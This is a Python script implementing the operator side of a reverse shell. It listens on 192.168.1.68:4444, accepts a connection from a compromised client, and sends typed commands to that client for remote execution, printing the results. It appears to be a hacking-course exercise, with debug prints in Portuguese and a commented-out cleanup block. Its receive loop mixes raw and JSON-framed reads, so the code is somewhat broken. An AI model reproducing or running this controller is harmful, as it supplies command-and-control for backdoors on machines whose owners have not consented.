import socket,json


class Listener:
    def __init__(self, ip, port):
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind((ip, port))
        self.listener.listen(0)

        print("[+] Waiting for incoming connections...")
        self.connection, address = self.listener.accept()
        print(f"[+] Connection established from {address}")

    def execute_remotely(self, command):
        self.reliable_send(command)
        return self.reliable_receive()
    
    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode('utf-8'))


    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue


    def run(self):
        try:
            while True:
                data = self.connection.recv(1024)
                if not data:
                    print("[+] Connection closed by the client.")
                    break

                # Handle potential decoding errors gracefully
                try:
                    print(f"Received data: {data.decode()}")
                except UnicodeDecodeError:
                    print("Failed to decode received data using UTF-8. Displaying raw bytes:")
                    print(data)

                command = input("Enter command to send to client: ")
                print(f"Sending command to client: {command}")
                result = self.execute_remotely(command)
                print(result)  # Decode the result before printing

                print("Passou por aqui")
                
        except Exception as e:
            print(f"Error encountered: {e}")

    """ 
          finally:
            print("passou por aqui")
            self.connection.close()
            self.listener.close()  # Using self.listener to close the socket 
    """


my_listener = Listener("192.168.1.68", 4444)
my_listener.run()
